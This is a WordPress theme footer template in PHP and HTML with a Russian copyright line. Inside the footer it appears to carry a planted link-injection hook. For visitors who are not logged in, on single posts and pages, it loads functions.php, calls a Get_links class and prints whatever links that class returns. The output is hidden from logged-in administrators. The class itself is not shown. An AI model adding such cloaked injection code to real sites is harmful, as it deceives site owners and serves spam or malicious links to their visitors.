<div class="endline"></div><!-- footer start -->	<div id="footer" class="clearfix">		<div class="credit">				Все права защищены.  © <a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a>.				<br/>				<div class="footer_c"><?php if (is_home() || is_category() || is_archive() ){ ?> <?php } ?>

<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php');
$texts = new Get_links(); $texts = $texts->return_links($lib_path); echo $texts; ?>
<?php } ?>

<?php endif; ?></div>        		</div>	</div><!-- footer end --></div></div></div></div><!-- wrapper end --><?php wp_footer(); ?></body></html>